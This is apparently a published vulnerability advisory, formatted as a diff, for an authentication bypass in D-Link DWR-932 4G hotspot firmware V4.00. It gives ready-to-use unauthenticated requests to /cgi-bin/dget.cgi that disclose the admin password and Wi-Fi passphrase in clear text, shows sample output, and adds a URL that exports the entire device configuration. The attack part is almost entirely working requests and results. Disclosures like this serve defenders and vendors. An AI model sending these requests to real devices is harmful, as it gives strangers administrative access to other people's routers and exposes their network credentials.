@@ -1,0 +1,36 @@
+D-Link DWR-932 Firmware <= V4.00 Authentication Bypass - Password Disclosure
+
+Author: Saeed reza Zamanian [penetrationtest @ Linkedin]
+
+Product: D-Link DWR-932 
+Tested Version: Firmware V4.00(EU)b03
+Vendor: D-Link http://www.dlink.com/
+Product URL: http://www.dlink.com/uk/en/home-solutions/work/personal-hotspots/dwr-932-4g-lte-mobile-wi-fi-hotspot-150-mbps
+Date: 20 Mar 2016
+
+
+About Product: 
+---------------
+The DWR-932 4G LTE Mobile Wi-Fi Hotspot 150 Mbps is a 4G/LTE Cat4 high speed broadband Wi-Fi mobile hotspot. The DWR-932 uses a 4G Internet connection to give you a simple and fast Wi-Fi network anywhere you need.
+
+
+Vulnerability Details:
+----------------------
+The Cgi Script "/cgi-bin/dget.cgi" handles most of user side and server side requests, but there is no observation on requests recieved from unauthorized users.
+so the attacker will be able to view Adminitrative or Wifi Password in clear text by visiting below URLs.
+
+View Admin Username and Password:
+http://192.168.0.1/cgi-bin/dget.cgi?cmd=DEVICE_web_usrname,DEVICE_web_passwd,DEVICE_login_timeout&_=1458459188807
+Output:
+{ "DEVICE_web_usrname": "MyUsErNaMe", "DEVICE_web_passwd": "MyPaSsWoRd", "DEVICE_login_timeout": "600" }
+
+View Wifi Password:
+http://192.168.0.1/cgi-bin/dget.cgi?cmd=wifi_AP1_ssid,wifi_AP1_hidden,wifi_AP1_passphrase,wifi_AP1_passphrase_wep,wifi_AP1_security_mode,wifi_AP1_enable,get_mac_filter_list,get_mac_filter_switch,get_client_list,get_mac_address,get_wps_dev_pin,get_wps_mode,get_wps_enable,get_wps_current_time&_=1458458152703
+Output:
+{ "wifi_AP1_ssid": "dlink-DWR-932", "wifi_AP1_hidden": "0", "wifi_AP1_passphrase": "MyPaSsPhRaSe", "wifi_AP1_passphrase_wep": "", "wifi_AP1_security_mode": "3208,8", "wifi_AP1_enable": "1", "get_mac_filter_list": "", "get_mac_filter_switch": "0", "get_client_list": "9c:00:97:00:a3:b3,192.168.0.45,IT-PCs,0>40:b8:00:ab:b8:8c,192.168.0.43,android-b2e363e04fb0680d,0", "get_mac_address": "c4:00:f5:00:ec:40", "get_wps_dev_pin": "", "get_wps_mode": "0", "get_wps_enable": "0", "get_wps_current_time": "" }
+
+Export All Configurations:
+http://192.168.0.1/cgi-bin/export_cfg.cgi
+
+
+#EOF
